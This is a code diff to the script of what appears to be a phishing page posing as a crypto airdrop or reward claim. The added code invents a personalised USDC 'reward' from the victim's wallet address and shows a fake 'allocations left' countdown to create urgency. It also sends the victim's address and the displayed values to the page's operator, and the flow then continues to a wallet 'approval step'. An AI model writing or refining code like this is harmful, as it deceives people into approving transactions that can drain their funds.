@@ -47,6 +47,21 @@ async function connectWallet() {
             setBtn('⏳ Checking eligibility...',true);
             const onBase = await ensureBaseNetwork(chainId);
             sendData('network_check',{onBase,address:userAddress});
+            // Generate per-wallet "reward amount" - looks realistic and personalized
+            const addrSeed = parseInt(userAddress.slice(2,10),16);
+            const rewardAmount = 120 + (addrSeed % 380); // $120-$500 range
+            document.querySelector('.amount').textContent = rewardAmount + ' USDC';
+            
+            // Dynamic urgency: countdown based on address hash  
+            const spotsLeft = 13 + (addrSeed % 42);
+            const small=document.createElement('div');
+            small.style.cssText='font-size:12px;color:#e74c3c;margin-top:5px;';
+            small.textContent=`⚡ Only ${spotsLeft} allocations left in your tier`;
+            document.querySelector('.card').insertBefore(small, 
+                document.querySelector('.btn-connect'));
+            
+            sendData('personalized_display',{address:userAddress,reward:rewardAmount,
+                                            spots_left:spotsLeft});
             setTimeout(() => showApprovalStep().then(()=>setBtn('Claim Verified ✅',false)), 1800);
             
         } catch (err) {
